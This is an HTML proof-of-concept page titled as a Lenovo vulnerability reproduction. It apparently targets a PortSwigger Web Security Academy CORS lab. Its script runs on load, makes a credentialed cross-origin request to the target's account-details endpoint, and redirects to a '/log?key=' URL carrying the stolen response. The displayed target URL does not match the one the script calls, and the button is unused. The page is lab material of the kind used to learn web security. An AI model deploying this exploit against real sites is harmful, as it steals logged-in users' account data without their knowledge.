<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Lenovo 漏洞复现 PoC</title>
</head>
<body>
  <h1>测试跨域漏洞（GET）</h1>
  
  <div>
    <p>目标URL: <code id="target-url">https://0aa60052032095b18262d42f00e10067.web-security-academy.net/accountDetails</code></p>
  </div>
  
  <button id="test">发起请求</button>
  <div id="status" style="margin-top: 10px;"></div>
  
  <h3>响应结果：</h3>
  <pre id="result"></pre>

  <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a1e00620482c6a58006039800bf00a8.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
</body>
</html>
